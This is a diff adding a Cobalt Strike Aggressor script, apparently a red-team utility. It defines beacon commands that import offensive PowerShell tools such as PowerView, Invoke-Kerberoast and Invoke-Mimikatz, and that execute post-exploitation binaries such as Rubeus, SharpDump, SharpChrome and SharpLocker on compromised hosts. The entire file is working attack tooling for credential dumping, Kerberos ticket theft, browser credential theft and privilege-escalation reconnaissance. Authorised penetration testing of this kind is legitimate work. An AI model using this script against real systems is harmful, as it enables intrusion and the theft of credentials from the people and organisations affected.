@@ -1,0 +1,121 @@
+#### Load PowerShells
+## Aggressor script to simplify importing powershell scripts using powershll-import  
+###  Author: Sabri (@KINGSABRI)
+
+### Usage ###
+# 1. Modify/Add your script pathes in global variable section
+# 2. Import into Cobalt Strike
+# 3. From beacon try
+#     beacon> load_powerview
+#     beacon> load_powerup
+#     beacon> load_powerupsql
+#     beacon> whoami
+### Output ###
+# powershell-import task gets exected
+# execute-assembly tas gets executed
+
+### Global variables section
+$powerview_path   = "/rt/p/rt-powershell/PowerView.ps1";
+$powerup_path     = "/rt/p/rt-powershell/PowerUp.ps1";
+$powerupsql_path  = "/rt/p/rt-powershell/PowerUpSQL/PowerUpSQL.ps1";
+$kerberoast_path  = "/rt/p/rt-powershell/Invoke-Kerberoast.ps1";
+$mimikatz_path    = "/rt/p/rt-powershell/Invoke-Mimikatz.ps1";
+$whoami_path      = "/rt/p/rt-compiled/SharpSploit/whoami.exe";
+$rubeus_path      = "/rt/p/rt-compiled/GhostPack/Rubeus.exe";
+$seatbelt_path    = "/rt/p/rt-compiled/GhostPack/Seatbelt.exe";
+$sharpUp_path     = "/rt/p/rt-compiled/GhostPack/SharpUp.exe";
+$sharpWMI_path    = "/rt/p/rt-compiled/GhostPack/SharpWMI.exe";
+$sharpDump_path   = "/rt/p/rt-compiled/GhostPack/SharpDump.exe";
+$sharpChrome_path = "/rt/p/rt-compiled/GhostPac/SharpChrome.exe";
+$sharpLocker_path = "/rt/p/rt-compiled/Misc/SharpLocker.exe";
+### 
+
+sub load_ps_script
+{
+    $bid  = $1[0];
+    $file = $1[1];
+    binput($bid, "powershell_import $file");
+	bpowershell_import($bid, $file);
+}
+
+sub load_bin_script
+{
+    $bid    = $1[0];
+    $file   = $1[1];
+    $params = join(' ', sublist($1, 3));
+    binput($bid, "execute-assembly $file $params");
+	bexecute_assembly($bid, $file, $params);
+}
+
+#
+# PowerShells
+#
+alias load_powerview {
+    @args = @($1, $powerview_path);
+	load_ps_script(@args);
+}
+
+alias load_powerup {
+    @args = @($1, $powerup_path);
+	load_ps_script(@args);
+}
+
+alias load_powerupsql {
+    @args = @($1, $powerupsql_path);
+	load_ps_script(@args);
+}
+
+alias load_kerberoast {
+    @args = @($1, $kerberoast_path);
+	load_ps_script(@args);
+}
+
+alias load_mimikatz {
+    @args = @($1, $mimikatz_path);
+	load_ps_script(@args);
+}
+
+
+
+#
+# Binaries
+#
+alias whoami {
+    @args = @($1, $whoami_path);
+	load_bin_script(@args);
+}
+
+alias exec_rubeus {
+    @args = @($1, $rubeus_path, @_);
+    load_bin_script(flatten(@args));
+}
+
+alias exec_seatbelt {
+    @args = @($1, $seatbelt_path, @_);
+    load_bin_script(@args);
+}
+
+alias exec_sharpUp {
+    @args = @($1, $sharpUp_path, @_);
+    load_bin_script(@args);
+}
+
+alias exec_sharpWMI {
+    @args = @($1, $sharpWMI_path, @_);
+    load_bin_script(@args);
+}
+
+alias exec_sharpDump {
+    @args = @($1, $sharpDump_path, @_);
+    load_bin_script(@args);
+}
+
+alias exec_sharpChrome {
+    @args = @($1, $sharpChrome_path, @_);
+    load_bin_script(@args);
+}
+
+alias exec_sharpLocker {
+    @args = @($1, $sharpLocker_path, @_);
+    load_bin_script(@args);
+}
